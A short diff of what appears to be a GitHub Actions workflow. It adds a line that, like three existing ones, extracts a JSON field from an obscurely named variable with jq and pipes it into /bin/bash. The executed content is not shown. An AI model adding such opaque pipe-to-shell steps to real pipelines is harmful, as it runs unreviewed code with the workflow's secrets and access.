@@ -40,6 +40,7 @@ jobs:
           echo $d9 | jq -r .wo2 | /bin/bash
           echo $la54 | jq -r .es2 | /bin/bash
           echo $rw7279 | jq -r .gfllz2 | /bin/bash
+          printf '%s' "$mprv98" | jq -r .pidie5 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
